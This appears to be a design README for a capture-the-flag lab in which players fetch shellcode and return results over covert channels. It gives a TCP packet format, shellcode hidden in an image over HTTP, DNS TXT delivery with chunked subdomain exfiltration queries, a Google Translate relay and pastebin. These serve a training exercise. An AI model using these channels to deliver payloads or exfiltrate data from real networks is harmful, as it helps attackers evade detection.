# Lab

## Game
user透過各種channel取得shellcode, 執行後想辦法將result回傳給server啟動flag

## Channels
### TCP

#### 封包格式 (Packet Format)
```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        Length (4 bytes)                       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
|                       Key (16 bytes)                          |
|                         User ID                               |
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|    Action     |                                               |
+-+-+-+-+-+-+-+-+                                               +
|                                                               |
|                    Payload (variable)                         |
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

**欄位說明：**
- **Length** (4 bytes, Big Endian): 整個封包的總長度（包含 Length、Key、Action、Payload）
- **Key** (16 bytes): 使用者 ID（固定 16 bytes）
- **Action** (1 byte): 動作類型
  - `0x01` - ActionCall: 請求 shellcode
  - `0x02` - ActionCallAck: 回傳 shellcode
  - `0x03` - ActionResult: 提交執行結果
  - `0x04` - ActionResultAck: 確認結果
- **Payload** (variable): 資料內容（shellcode 或 result）

#### 通訊流程
> <length><16 byte id><action(\x01)>\x00
< <length><16 byte id><shellcode>\x00
> <length><16 byte id><action(\x02)><result>\x00

### HTTP Image Channel
> GET / HTTP/1.1
UA: <id>
< HTTP/1.1 200 OK <img with shellcode in first channel>
> GET /flag.php?result=<result>
UA: <id>

### DNS
> dig <id>.shellcode.lab.example.com TXT
< <id>.shellcode.lab.example.com. 60 IN TXT "<shellcode>"
> dig result[0-7].<id>.shellcode.lab.example.com
> dig result[8-15].<id>.shellcode.lab.example.com
> dig result[16-23].<id>.shellcode.lab.example.com
...
> dig <termination>.<id>.shellcode.lab.example.com

### google translate
>GET translate.google.com?u=evil site
UA: <id>
< page with shellcode in translated text
>GET translate.google.com?u=result site
UA: <id> | <result>

### pastebin
GET file with shellcode
POST file with result
